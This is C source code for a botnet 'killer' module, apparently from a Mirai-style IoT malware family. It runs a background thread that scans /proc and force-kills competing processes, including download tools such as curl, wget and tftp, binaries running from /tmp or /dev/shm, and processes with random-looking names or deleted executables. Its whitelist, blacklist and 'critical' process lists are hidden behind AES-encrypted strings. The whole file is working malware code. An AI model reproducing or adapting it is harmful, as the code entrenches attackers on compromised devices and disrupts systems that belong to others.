#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <ctype.h>
#include <signal.h>
#include <linux/limits.h>
#include <stdint.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <stddef.h>

#include "headers/killer.h"
#include "headers/aes.h"
#include "headers/config.h"

#define PATH_LEN 512
#define MAX_PROCS 1024
#define DUP_THRESHOLD 4
#define BUFFER 512
#define MAX_INODES 4096
#define MAX_REALPATHS 1024

volatile int killer_active = 0;

const char *whitelisted[] = {
    "a170dc7990d0b0454cb81486eda15d857cbac40d351d4543eb233c0b1368b279",
    "652e1785a48d315e4a36a27c2566d84c14f13c31155cdb04685b420f37ed1ed1",
    "0e0db3506ff843db9bfeff3144ba1fd3ca345626c8adf5cbb5d9d1b224c66947",
    "6c23c9b4f83d37fedcee506c28f743f1b17964a27d299bd1ce4c76715e50151f",
    "9663df3885b8caed9368d30a183f9e8a5af421a75c52cd2120a9624568997505",
    "a9057626347337c519614e312179214a5237d669429553a32b70287843a25cf2", 
    "d14d57a9902c189db1537c4178b3d025fa50df15f01a2fe12274e82243b7628b",
    "0f789e7cf8a1a40159b1bc4b228fcfd7342dda0ce0264f1a498bef297f88b891",
    "c6370099bee93ce7c4b117f7949f9edd0ede5c2a319e0e94b9776611eb65a88b",
    "dab8006ffa61052f265e08118dd3c1b920b14338f06604cb179066d29add7032",
    "848e43671490fd10be19a793e3122be0244fa8542affacdb7ec56e2726169c14",
    "22bcc89516fc6eb00a9d218fb4e3535bea535d1746aa216c8362c818d571a4ef",
    "1e423c52835a97504bc2e05083282b3320f0b2d7041a8f12f70e17d590748a5a",
    "afd3abaad4b83bee96efb0931a512a71444b767332ed05fb70fbd423e0a9cecf",
    "245a92b5907fe2eaccc4ac161445e05981e204ed1519a2643fafd4d4d1507855",
    NULL
};

static const char *blacklisted[] = {
    "26a8d078cea5dad2af3b9bea9ad9c8c7afe75495b73036eee27b895c654a5652",
    "b43ed9347ff372c00bb33e297f71c6e499e52d13d70f7ca8d21d39f256dd5d7f",
    "03754966d64a3cc3173e1b56c45e7404668b8310e9fbdacaa07bfcd10b7a8081",
    "3aae4cd9f22a3a8973dca69820b63dedc60b5704efc047317bde5bd0c093618b",
    "a29a1a318af843dedafaabee63660f90152737745e636109046e1ecbb65ab48c",
    "bed6aaed9f9aa3ece7c3f66be4c83ba10ff43b0f9095d7110421fd6605550986",
    "39bca43c052af88c001e810dac1897e3c66b41a861b346c90d4045fbcf8924dd",
    "10f88eb24211f941638fa58d96b5d99259e0ea995f19fadfcb85a72172edbb5f",
    "27707a49472c8d6a0a889c77081096fefeb8a7b53157180983b1f4b7fc3bd7bb",
    "a68a73b1ef3db59303ebac79233274a276544d58438e735e1375812d7fd44fed",
    "d25076cc6471cb0f7bd7204e7390ba2ea147cb6eb53b018d9618d34967148d29",
    NULL
};

typedef struct {
    char inode[32];
} inode_t;

typedef struct {
    char realpath[PATH_MAX];
} realpath_t;

static char self_realpath[PATH_MAX] = {0};
static inode_t inode_list[MAX_INODES];
static realpath_t realpath_list[MAX_REALPATHS];
static int inode_index = 0;
static int realpath_index = 0;

static inline int is_whitelisted(const char *path) {
    for (int i = 0; whitelisted[i] != NULL; i++) {
        char *tmp = aes_decrypt_hex_string(AES_KEY, whitelisted[i]);
        if (strstr(path, tmp)) {
            free(tmp);
            return 1;
        }
    }
    return 0;
}

static inline int is_blacklisted(const char *path) {
    for (int i = 0; blacklisted[i] != NULL; i++) {
        char *tmp = aes_decrypt_hex_string(AES_KEY, blacklisted[i]);
        if (strstr(path, tmp)) {
            free(tmp);
            return 1;
        }
    }
    return 0;
}

static inline void kill_process(pid_t pid) {
    if (pid <= 0 || pid == 1 || pid == getpid() || pid == getppid()) return;
    kill(pid, SIGKILL);
}

static inline int is_suspicious_name(const char* name) {
    int weird_chars = 0;
    int len = strlen(name);
    
    if (strstr(name, "systemd") || strstr(name, "init") ||
        strstr(name, "kthreadd") || strstr(name, "kworker") ||
        strstr(name, "ksoftirqd") || strstr(name, "watchdog") ||
        strstr(name, "migration") || strstr(name, "rcu") ||
        strstr(name, "sshd") || strstr(name, "cron")) {
        return 0;
    }

    for (int i = 0; i < len; i++) {
        if (!isalnum(name[i])) weird_chars++;
    }
    
    return (weird_chars > 2) || (len >= 6 && len <= 12 && strspn(name, "0123456789abcdef") == len);
}

static inline int check_comm(const char* pid_str) {
    char path[PATH_LEN];
    char line[256] = {0};
    char comm_path[PATH_LEN];
    char comm_content[256] = {0};
    int fd;
    
    if (!pid_str || !isdigit(pid_str[0])) return 0;

    snprintf(path, sizeof(path), "/proc/%s/cmdline", pid_str);
    fd = open(path, O_RDONLY);
    if (fd >= 0) {
        ssize_t n = read(fd, line, sizeof(line)-1);
        close(fd);
        if (n > 0) {
            line[n] = '\0';
            if (strstr(line, "curl") || strstr(line, "wget") ||
                strstr(line, "tftp") || strstr(line, "ftp")) {
                return 1;
            }
        }
    }

    snprintf(comm_path, sizeof(comm_path), "/proc/%s/comm", pid_str);
    fd = open(comm_path, O_RDONLY);
    if (fd >= 0) {
        ssize_t n = read(fd, comm_content, sizeof(comm_content)-1);
        close(fd);
        if (n > 0) {
            comm_content[n] = '\0';
            char* newline = strchr(comm_content, '\n');
            if (newline) *newline = '\0';
            
            if (is_suspicious_name(comm_content)) {
                return 1;
            }
        }
    }

    return 0;
}

static inline int is_low_entropy(const char *str) {
    int len = strlen(str);
    if (len < 6) return 0;
    int hex = 1, same = 1;
    char first = str[0];
    for (int i = 0; i < len; i++) {
        if (!isxdigit(str[i])) hex = 0;
        if (str[i] != first) same = 0;
    }
    return hex || same;
}

static inline int is_critical_process(const char *exe_real, const char *comm_content) {
    const char *critical[] = {
        "24015a5e7d9290920ec9711ce3c7463242c61405c562de1ac9489bff307336ec",
        "a0739d51cc065a4d8fbde03f42eccf345ff4f0e161933f883753c8675ac5f4f8",
        "0aa61cb3a652cca0292513bbca523c91ff53f43bb5b778025f70acbbe460b240",
        "061d17a496a5aee21cc116a4ceca6721a597cec3ffc8a3892e15483153b53335",
        "e828331e0a815a48be0887dd9c996899fb16209726804ac89899f5a4fcd61614",
        "3cc942198b12b069149d5435a3adb8a53ae36b82cdcf05ab5818bceb268bff80",
        "a77b9133fa23a3b4f087fceae4e5b71c47f4fa703ff2bc06b4c9c54716785ccb",
        "ccd759f4e20b7e1819c70d3d0947f82511423a50af52e71df0b52f332a7b2c1a",
        "627d1030f75d6c3601a22f6c10ec78bfcd7c1ab4563c27bb65ad1c763d3ca6f066c70e8aa1894005594614e84750c4cc",
        "9f1092510dcccdb5874175e1f681bd6abf5863ccd6b219eb4eef748c18640354",
        "6677f93bc69f001a80f397c43355ea51b94e97a3421a072435498409204888187b1837d17ea4a569be16f99007594a36",
        "5de7c8f5a495d71db82258bad213deabd6fe2972ca7794931c6f77ffd9600870a6c700ed6a6c151d653c1d9c0f169f7e",
        "d2ce16ef96c4a2f68d445d592e7ebee5a3c9052feb3fd66437702d5dffe14ed740b7c594e3a7d3e04db5dc1694299cbc",
        "08b4b97ab9539aafec08118d78ead3a0d258b391599f853a1f9d4e1e14359498",
        "462ed0ca19a2a242c888359ab5dd13c9947a7f07dee87f6c90ec3b01f1492cca",
        "d619ed62256e50b4bb191cd9ee5e929e05819b608095b986559145748de6cc74",
        "3ba48c8fc99fe60a8e00e11f96ae6f3ceddee362443b2de85221bca121b2bca62e87494704555d2e776bea3a214a8517",
        "d00e1e3217d50a643928f93f42885282937e08f980fc3deb893bb3e8436ab0d2b392ab5c01638658cd82181a0095b173",
        NULL
    };
    for (int i = 0; critical[i] != NULL; i++) {
        char *tmp = aes_decrypt_hex_string(AES_KEY, critical[i]);
        if ((exe_real && strstr(exe_real, tmp)) || (comm_content && strstr(comm_content, tmp))) {
            free(tmp);
            return 1;
        }
    }
    return 0;
}

static inline int check_for_malware(const char *pid_str) {
    char exe_path[PATH_LEN];
    char exe_real[PATH_LEN] = {0};
    char cmdline_path[PATH_LEN];
    char cmdline[PATH_LEN] = {0};
    char comm_path[PATH_LEN];
    char comm_content[256] = {0};
    struct stat st;
    int fd;
    ssize_t n;
    uid_t uid = 0;

    snprintf(exe_path, sizeof(exe_path), "/proc/%s/exe", pid_str);
    ssize_t exe_len = readlink(exe_path, exe_real, sizeof(exe_real) - 1);
    if (exe_len > 0) {
        exe_real[exe_len] = '\0';
        if (stat(exe_real, &st) == 0) {
            uid = st.st_uid;
        }
        if (is_critical_process(exe_real, NULL))
            return 0;
        if (uid == 0 && !(strstr(exe_real, "/tmp/") || strstr(exe_real, "/dev/shm/") || strstr(exe_real, "/var/run/")))
            return 0;
        if (strstr(exe_real, "/tmp/") || strstr(exe_real, "/dev/shm/") || strstr(exe_real, "/var/run/")) {
            if (!is_critical_process(exe_real, NULL) && uid != 0)
                return 1;
        }
        const char *base = strrchr(exe_real, '/');
        if (base) base++;
        else base = exe_real;
        int blen = strlen(base);
        if (blen >= 6 && blen <= 12 && is_low_entropy(base) && uid != 0)
            return 1;
        if ((strstr(exe_real, "/tmp/") || strstr(exe_real, "/dev/shm/") || strstr(exe_real, "/var/run/")) && stat(exe_real, &st) == 0 && (st.st_mode & S_IWOTH) && uid != 0)
            return 1;
    }

    snprintf(cmdline_path, sizeof(cmdline_path), "/proc/%s/cmdline", pid_str);
    fd = open(cmdline_path, O_RDONLY);
    if (fd >= 0) {
        n = read(fd, cmdline, sizeof(cmdline)-1);
        close(fd);
        if (n > 0) {
            cmdline[n] = '\0';
            if (strstr(cmdline, "/bin/busybox") && strlen(cmdline) < 32 && uid != 0)
                return 1;
            if (strstr(cmdline, "/bin/sh") && strlen(cmdline) < 32 && uid != 0)
                return 1;
        }
    }

    snprintf(comm_path, sizeof(comm_path), "/proc/%s/comm", pid_str);
    fd = open(comm_path, O_RDONLY);
    if (fd >= 0) {
        n = read(fd, comm_content, sizeof(comm_content)-1);
        close(fd);
        if (n > 0) {
            comm_content[n] = '\0';
            char* newline = strchr(comm_content, '\n');
            if (newline) *newline = '\0';
            int clen = strlen(comm_content);
            if (is_critical_process(NULL, comm_content))
                return 0;
            if (clen >= 6 && clen <= 12 && is_low_entropy(comm_content) && uid != 0)
                return 1;
        }
    }

    return 0;
}

static inline int check_cmdline(const char *pid_str) {
    char path[PATH_LEN];
    char buf[PATH_LEN] = {0};  
    int fd;
    
    if (snprintf(path, sizeof(path), "/proc/%s/cmdline", pid_str) >= sizeof(path)) {
        return 0;
    }
    fd = open(path, O_RDONLY);
    if (fd >= 0) {
        ssize_t n = read(fd, buf, sizeof(buf)-1);
        close(fd);
        if (n > 0) {
            buf[n] = '\0';
            for (int i = 0; blacklisted[i] != NULL; i++) {
                if (strstr(buf, blacklisted[i])) {
                    return 1;
                }
            }
        }
    }
    return 0;
}

typedef struct {
    char name[256];
    int count;
} ProcCount;

static inline int check_duplicates(const char* name, ProcCount* procs, int* proc_count) {
    for (int i = 0; i < *proc_count; i++) {
        if (strcmp(procs[i].name, name) == 0) {
            procs[i].count++;
            return procs[i].count >= DUP_THRESHOLD;
        }
    }
    
    if (*proc_count < MAX_PROCS) {
        strncpy(procs[*proc_count].name, name, 255);
        procs[*proc_count].count = 1;
        (*proc_count)++;
    }
    return 0;
}

static char *get_inode(char *buf) {
    int len = strlen(buf);
    for (int i = 91; i < len; i++) {
        if (buf[i] == ' ') {
            buf[i] = 0;
            return buf + 91;
        }
    }
    return NULL;
}

static void append_inode(char *inode) {
    if (inode_index < MAX_INODES) {
        strncpy(inode_list[inode_index].inode, inode, 31);
        inode_index++;
    }
}

static int check_deleted(char *realpath) {
    int fd = open(realpath, O_RDONLY);
    if (fd == -1) return 1;
    close(fd);
    return 0;
}

static int find_realpath(char *realpath) {
    for (int i = 0; i < realpath_index; i++) {
        if (strcmp(realpath, realpath_list[i].realpath) == 0)
            return 1;
    }
    return 0;
}

static char *get_PPid(char *buf, int buf_len) {
    char *ppid_str = strstr(buf, "PPid:");
    if (ppid_str == NULL) return NULL;
    
    ppid_str += 5;
    while (*ppid_str == ' ' || *ppid_str == '\t') ppid_str++;
    
    return ppid_str;
}

static int fine_inode(char *inode) {
    for (int i = 0; i < inode_index; i++) {
        if (strcmp(inode, inode_list[i].inode) == 0)
            return 1;
    }
    return 0;
}

static int check_fd_path(char *pid) {
    char fd_path[32] = {0};
    char fds[] = {'0', '5'};
    
    snprintf(fd_path, sizeof(fd_path), "/proc/%s/fd/", pid);
    int len = strlen(fd_path);

    for (unsigned int i = 0; i < sizeof(fds) / sizeof(fds[0]); i++) {
        char full_path[32];
        snprintf(full_path, sizeof(full_path), "%s%c", fd_path, fds[i]);

        char rdbuf[32] = {0};
        ssize_t rdbuf_len = readlink(full_path, rdbuf, sizeof(rdbuf) - 1);
        if (rdbuf_len == -1) continue;

        if (i == 0) {
            if (strncmp(rdbuf, "/dev/null", 9) == 0 || 
                strncmp(rdbuf, "/dev/console", 12) == 0)
                return 0;
        }

        if (strncmp(rdbuf, "/proc/", 6) == 0) {
            return 1;
        } else if (strncmp(rdbuf, "socket:", 7) == 0) {
            rdbuf[rdbuf_len] = 0;
            if (fine_inode(rdbuf + 7))
                return 1;
        }
    }
    return 0;
}

static int check_status(char *pid) {
    char status_path[32];
    snprintf(status_path, sizeof(status_path), "/proc/%s/status", pid);
    
    int fd = open(status_path, O_RDONLY);
    if (fd == -1) return 0;

    char rdbuf[256] = {0};
    int len = read(fd, rdbuf, sizeof(rdbuf) - 1);
    close(fd);

    if (len <= 0) return 0;

    char *PPid = get_PPid(rdbuf, len);
    if (PPid == NULL) return 0;

    if (atoi(PPid) == 1 && check_fd_path(pid))
        return 1;

    return 0;
}

static void append_realpath(char *realpath) {
    if (realpath_index < MAX_REALPATHS) {
        strncpy(realpath_list[realpath_index].realpath, realpath, PATH_MAX - 1);
        realpath_index++;
    }
}

static int check_realpath(char *pid) {
    char exe_path[32];
    char realpath[PATH_MAX] = {0};

    snprintf(exe_path, sizeof(exe_path), "/proc/%s/exe", pid);
    if (readlink(exe_path, realpath, sizeof(realpath) - 1) == -1 || 
        strcmp(realpath, self_realpath) == 0)
        return 0;

    if (check_deleted(realpath)) {
        return 1;
    }

    if (check_status(pid)) {
        if (!find_realpath(realpath)) {
            append_realpath(realpath);
        }
        return 1;
    }

    return 0;
}

static int compare_realpath(char *pid) {
    char exe_path[32];
    char realpath[PATH_MAX] = {0};

    snprintf(exe_path, sizeof(exe_path), "/proc/%s/exe", pid);
    if (readlink(exe_path, realpath, sizeof(realpath) - 1) == -1)
        return 0;

    if (find_realpath(realpath)) {
        return 1;
    }

    return 0;
}

static void scan_tcp_connections(void) {
    inode_index = 0;
    
    int fd = open("/proc/net/tcp", O_RDONLY);
    if (fd == -1) return;

    char rdbuf[256] = {0};
    while (read(fd, rdbuf, sizeof(rdbuf) - 1) > 0) {
        char *inode = get_inode(rdbuf);
        if (inode == NULL || inode[0] == '0' || inode[0] == 'i')
            continue;
        append_inode(inode);
    }
    close(fd);
}

static void* killer_thread(void* arg) {
    DIR *dir;
    struct dirent *entry;
    pid_t pid;
    char comm_path[PATH_LEN];  
    char comm_content[PATH_LEN] = {0};
    struct timespec sleep_time = {0, 19800000}; 

    if (readlink("/proc/self/exe", self_realpath, sizeof(self_realpath) - 1) == -1) {
        self_realpath[0] = 0;
    }
    
    while(killer_active) {
        scan_tcp_connections();
        
        dir = opendir("/proc");
        if (!dir) {
            nanosleep(&sleep_time, NULL);
            continue;
        }

        realpath_index = 0;

        while ((entry = readdir(dir)) && killer_active) {
            if (!entry->d_name || !isdigit(entry->d_name[0])) continue;
            
            pid = atoi(entry->d_name);
            if (pid <= 1 || pid == getpid() || pid == getppid()) continue;

            if (check_comm(entry->d_name)) {
                kill_process(pid);
                usleep(1000);
                continue;
            }

            if (check_cmdline(entry->d_name)) {
                kill_process(pid);
                usleep(1000);
                continue;
            }

            if (check_for_malware(entry->d_name)) {
                kill_process(pid);
                usleep(1000);
                continue;
            }

            if (check_realpath(entry->d_name)) {
                kill_process(pid);
                usleep(1000);
                continue;
            }

            if (snprintf(comm_path, sizeof(comm_path), "/proc/%s/comm", entry->d_name) >= sizeof(comm_path)) {
                continue;
            }
            
            int fd = open(comm_path, O_RDONLY);
            if (fd >= 0) {
                ssize_t n = read(fd, comm_content, sizeof(comm_content)-1);
                close(fd);
                if (n > 0) {
                    comm_content[n] = '\0';
                    char* newline = strchr(comm_content, '\n');
                    if (newline) *newline = '\0';
                    
                    for (int i = 0; blacklisted[i] != NULL; i++) {
                        if (strstr(comm_content, blacklisted[i])) {
                            kill_process(pid);
                            usleep(1000);
                            break;
                        }
                    }
                }
            }
        }
        closedir(dir);

        if (realpath_index > 0) {
            dir = opendir("/proc");
            if (dir) {
                while ((entry = readdir(dir)) && killer_active) {
                    if (!entry->d_name || !isdigit(entry->d_name[0])) continue;
                    
                    pid = atoi(entry->d_name);
                    if (pid <= 1 || pid == getpid() || pid == getppid()) continue;
                    
                    if (compare_realpath(entry->d_name)) {
                        kill_process(pid);
                        usleep(1000);
                    }
                }
                closedir(dir);
            }
        }
        
        int ms = 500 + (rand() % 501);
        sleep_time.tv_sec = ms / 1000;
        sleep_time.tv_nsec = (ms % 1000) * 1000000L;
        nanosleep(&sleep_time, NULL);
    }
    return NULL;
}

void start_killer(void) {
    killer_active = 1;
    pthread_t thread;
    if (pthread_create(&thread, NULL, killer_thread, NULL) != 0) {
        return;
    }
    pthread_detach(thread);
}

void stop_killer(void) {
    killer_active = 0;
}
